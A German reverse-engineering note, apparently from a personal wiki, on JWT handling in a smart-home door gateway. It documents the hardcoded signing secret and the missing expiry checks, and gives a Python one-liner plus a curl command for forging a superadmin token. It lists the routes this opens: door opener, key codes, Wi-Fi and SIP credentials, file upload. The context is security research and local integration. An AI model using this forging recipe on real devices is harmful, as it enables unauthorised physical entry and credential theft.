# JWT-Forging auf dem Villa GW

Konsolidiertes Reverse Engineering aller JWT-Pfade — sowohl die **Web-API**
(OpenResty/Lua) als auch das **Cloud-Token** (avlink-MQTT-Auth) und der
**OTA-Update-Endpoint** (`firmware_upgrade.lua`).

→ Ergänzt [[http_api]] (dort Web-JWT-Erstanalyse), [[database]] (Token im DB-Eintrag
`cloud_account`), [[security_audit]] (Security-Bewertung).

## TL;DR

Drei JWT-Universen mit unterschiedlichen Schlüsseln und Validierungsregeln:

| Universum | Verbraucher | Secret-Bekannt? | Validation | Forge-Aufwand |
|---|---|---|---|---|
| **Web-API** (Token aus Cookie) | `login.lua` / `verify.lua` / alle `/api/…`-Endpunkte | ✅ ja, hardcoded: `"hard to guess string device"` | nur Existenz von `name` + `group` (Int), **kein `exp`-Check** | **trivial** — kompletter Admin-Bypass |
| **Cloud-MQTT-Token** (`config.token` in DB) | `avlink` MQTT-Connect via username/password | ❌ unbekannt (Server-Secret bei iLifeStyle Cloud) | Server-seitig | **nicht forge-bar lokal** — aber per DB-Edit ersetzbar |
| **OTA-Server-Token** (`firmware_upgrade.lua`) | Cloud-Update-Server (`c1.ilifestyle-cloud.com`) | ❌ unbekannt | Server-seitig | Hardcoded Beispiel-Token im Dump (vermutlich Dev-Test-Token, evtl. abgelaufen) |

Forge-Pfad für lokalen Vollzugriff: **Web-API-Token mit `name=foo, group=0` selbst signieren**.
group=0 = Superadmin (siehe [[http_api]]). Damit umgeht man auch
`elock.lua`/`key.lua` ohne Gruppen-Check.

## 1. Web-API-JWT — der einzige relevante Forge-Pfad

### Implementation: `/customer/lua/jwt.lua`

```lua
function Jwt:encode(key)
    key = key or 'hard to guess string device'
    libjwt.set_alg(self.jwt, libjwt.JWT_ALG_HS256, key)
    return libjwt.encode_str(self.jwt)
end

function Jwt:decode(token, key)
    key = key or 'hard to guess string device'
    local jwt = libjwt.decode(token, key)
    if not jwt then return nil end
    return Jwt:new(jwt)
end
```

→ Secret ist die literale Zeichenkette `hard to guess string device`
(34 Bytes inkl. Leerzeichen) — **dieselbe** für encode und decode, niemals
parametrisch überschrieben in Login-Path.

### Verifikation: `login.lua:9-25` / `verify.lua:8-42`

```lua
local jwt = Jwt:decode(token)              -- entschlüsselt mit Default-Secret
if not jwt then return false end
local name = jwt:get_grant('name')
local group = jwt:get_grant_int('group')
if name and group then
    ngx.ctx.name = name
    ngx.ctx.group = group
    ret = true
end
```

Es wird **ausschließlich** auf das Vorhandensein von `name` + `group` geprüft —
**kein `exp`-Vergleich**, **kein `nbf`**, **kein `iat`-Window**, kein
issuer-Match, kein audience-Match.

Der `iat`-Wert wird beim Encode **als zukünftiges Datum** (`os.time()+60*60`)
abgelegt — ein Hinweis darauf, dass die Implementation den Sinn von `iat`
(„issued at") falsch verwendet, vermutlich als impliziter `exp`. Da der
Decode-Pfad `iat` aber gar nicht prüft, ist der Token **ewig gültig** ab
Signatur-Sekunde 1.

### Token-Forging — Rezept

Payload-Felder (aus `login.lua:60-67`):

```lua
jwt:add_grant_int('iat', os.time()+60*60)
jwt:add_grant('name', name)
jwt:add_grant('device_id', mac)        -- ifconfig eth0 HWaddr
jwt:add_grant('model', 'ACP-03')
jwt:add_grant_int('type', 2)
jwt:add_grant_int('group', group)
```

Minimum für Bypass: `{"name": "x", "group": 0}` — Rest darf fehlen.

Beispiel-Forge (Python, ein Liner):

```python
import jwt as pyjwt
token = pyjwt.encode(
    {"name": "x", "group": 0},
    "hard to guess string device",
    algorithm="HS256",
)
# Send as: Cookie: token=<token>
```

Test:

```sh
curl -k -H "Cookie: token=$TOKEN" https://203.0.113.10/api/test
```

Bei Erfolg liefert jede unter `/api/`-Route ohne `verify.lua`-Skip ein 200.
Bei Routen ohne JWT-Check (`/api/upload`, `/api/test`, `/api/reboot`, `/api/sync`
laut [[http_api]]) braucht es nicht mal den Token.

### Welche Routen lassen sich mit dem geforgten Token tun

Siehe [[http_api]] Übersicht. Insbesondere:

| Route | Eingriff |
|---|---|
| `/api/elock` | Türöffner direkt — kein Group-Check (CVE-Klasse: Auth-Bypass) |
| `/api/key` | Schlüsselcodes lesen/schreiben |
| `/api/sip` | SIP-Konfig (Cleartext-Pw zurückgeben) |
| `/api/network` | WLAN-Credentials lesen/setzen |
| `/api/reboot` | Reboot |
| `/api/upload` | beliebige Datei-Uploads (Pre-RCE) |
| `/api/sync` | DB-Sync-Trigger |

Für HA-Integration braucht es **kein** Forging — wir hätten den realen
Admin-Login als Konfiguration. Aber es ist ein Pfad, der bei
gehackter/verlorener Credentials-Storage trotzdem unauffällig hilft.

## 2. Cloud-MQTT-JWT — nicht forge-bar, aber ersetzbar

### Was wir wissen (aus `avl20.dump.sql` und [[database]])

DB-Eintrag `config[cloud_account].token`:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJhcHAiOjEsInVpZCI6InUwMGMwMDAwMDAwMDIyY2QiLCJ1Z3AiOjQsImRpZCI6IkE4QjU4RTg1MzU2RSIsImRtZCI6IkFWTDIwUCIsImR0cCI6NiwiaWF0IjoxNzc5MzY4MjI3fQ.
AG_buL-q0mOy2g7hlclzP3YUJ4iB9NafNcOzsGPHNbw
```

Payload decoded:

```json
{
  "app": 1,
  "uid": "u00c0000000022cd",
  "ugp": 4,
  "did": "AA:BB:CC:DD:EE:FF",
  "dmd": "AVL20P",
  "dtp": 6,
  "iat": 1779368227
}
```

- `alg`: HS256
- **kein `exp`** — also serverseitig vermutlich ewig gültig
- Signatur-Secret ist iLifeStyles eigenes, **nicht** das Web-API-Secret aus
  jwt.lua. avlink validiert das Token nicht — er reicht es nur an den
  MQTT-Server weiter (als `username` oder `password`-Feld bei
  `mosquitto_username_pw_set`).

### Konsequenz für unseren Hijack

Wir können das Cloud-Token **nicht selbst signieren**, aber wir **brauchen es
auch nicht**: sobald wir `mqtt_server` per DB auf unseren lokalen Broker
umlegen, akzeptiert unser Broker beliebige username/password — der Token wird
nie geprüft.

→ Cloud-JWT ist für den Hijack-Pfad irrelevant; bleibt nur ein interessanter
Datenpunkt für Privacy-Audit (das Token leakt unsere Cloud-UID + MAC).

## 3. OTA-JWT (firmware_upgrade.lua)

Aus `/customer/share/firmware_upgrade.lua` (siehe [[boot_init]]):

```lua
token = "REDACTED_JWT"
```

Decoded:

```json
{
  "iat": 1583744811.8167737,   // 2020-03-09 — über 5 Jahre alt
  "id": "0000000000000016",
  "group": 2,
  "type": 2,
  "model": "VCP01",            // anderes Gerätemodell!
  "device_id": "11:22:33:44:55:66",  // FREMDE MAC
  "uid": 2818
}
```

Das ist offensichtlich ein **Dev/Testing-Token**, im Code als Fallback wenn
`Parm.config.token` leer ist. Es zeigt, dass der OTA-Server auf der
Cloud-Seite ein **anderes JWT-Schema** benutzt als das MQTT-Token
(`id`/`uid`/`group`/`type`/`model` statt `app`/`uid`/`ugp`/`did`/`dmd`/`dtp`).

Beide Universen sind HS256, aber Felder + Secret unterscheiden sich. Keine
forge-bare Lücke ohne das Server-Secret.

Sicherheitlich relevant: dass dieser Test-Token überhaupt im production-Image
liegt, ist sloppy — er wurde mit Sicherheit vor 5+ Jahren ausgegeben und
vermutlich revoked, aber im Code als Fallback verbleibt er.

## Open Items für `live_forensics.md`

- [ ] `grep -RE 'hard to guess|secret|JWT_ALG' /customer/lua/` — gibt es noch
      weitere Secret-Strings, die wir statisch übersehen haben?
- [ ] `cat /customer/share/avl20.db` mit `sqlite3 .dump` — finden wir ein
      anderes Token-Feld neben `cloud_account.token`?
- [ ] avlink mit gdb attachen und auf `mosquitto_username_pw_set` Breakpoint:
      sehen, ob `password` das JWT ist oder die separate `password`-Feld aus
      `cloud_account` JSON (`REDACTED_CLOUD_PW`)
- [ ] strace auf nginx-Worker während `/api/login` → confirms HS256-Path
- [ ] Suche nach `purpose.lua`, `account.lua` etc. nach weiteren JWT-Verbrauchern

Verwandt: [[http_api]], [[database]], [[security_audit]], [[avlink]], [[cloud_sync]].
